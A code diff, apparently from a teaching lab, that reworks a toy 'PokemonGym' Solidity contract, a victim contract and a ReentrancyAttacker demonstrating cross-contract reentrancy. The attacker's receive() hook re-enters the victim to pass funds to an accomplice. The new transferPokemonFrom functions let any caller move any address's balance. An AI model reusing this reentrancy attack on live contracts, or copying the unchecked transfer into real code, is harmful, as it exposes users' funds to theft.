@@ -89,8 +89,12 @@ contract PokemonGym is Ownable {
 
     constructor() Ownable(msg.sender) {}
 
-    function transfer(address _to, uint256 _amount) external notEnoughPokemon(_amount) returns (bool) {
-        s_pokemonAmount[msg.sender] -= _amount;
+    function transferPokemonFrom(address _from, address _to, uint256 _amount)
+        external
+        notEnoughPokemon(_from, _amount)
+        returns (bool)
+    {
+        s_pokemonAmount[_from] -= _amount;
         s_pokemonAmount[_to] += _amount;
         return true;
     }
@@ -109,8 +113,8 @@ contract PokemonGym is Ownable {
         return s_pokemonAmount[_owner];
     }
 
-    modifier notEnoughPokemon(uint256 _amount) {
-        if (!(s_pokemonAmount[msg.sender] > _amount)) {
+    modifier notEnoughPokemon(address _from, uint256 _amount) {
+        if (s_pokemonAmount[_from] < _amount) {
             revert Pokemon_NotEnoughPokemon();
         }
         _;
@@ -154,8 +158,16 @@ contract ReentrancyVictimContract is ReentrancyGuard {
         pokemonGym.releaseAllPokemon(msg.sender);
     }
 
+    function transferPokemonFrom(address _from, address _to, uint256 _amount) public returns (bool) {
+        return pokemonGym.transferPokemonFrom(_from, _to, _amount);
+    }
+
+    function balanceOf(address user) public returns (uint256) {
+        return pokemonGym.balanceOf(user);
+    }
+
     modifier notEnoughEthers(uint256 value) {
-        if (value != 0.1 ether) {
+        if (value < 1 ether) {
             revert ReentrancyVictimContract_notEnoughEthers();
         }
         _;
@@ -209,7 +221,7 @@ contract ReentrancyAttacker {
     }
 
     receive() external payable {
-        // the attacker's token has not been burn: he can transfer it to carl
+        // the attacker's amount has not yet been removed/burn: he can transfer it to evil carl
         if (currentAttackType == CrossAttackType.FUNCTION) {
             if (address(victimFunction).balance >= msg.value) {
                 victimFunction.transfer(accomplice, 1 ether);
@@ -217,12 +229,12 @@ contract ReentrancyAttacker {
         }
         if (currentAttackType == CrossAttackType.CONTRACT) {
             if (address(victimContract).balance >= msg.value) {
-                victimContract.transfer(accomplice, 1 ether); // 
+                victimContract.transferPokemonFrom(address(this), accomplice, 1);
             }
         }
     }
 
-    function getOkTokenBalance(address _user) public view returns (uint256) {
-        return victimContract.getOkToken().balanceOf(_user);
+    function getPokemonAmount(address user) public returns (uint256) {
+        return victimContract.balanceOf(user);
     }
 }
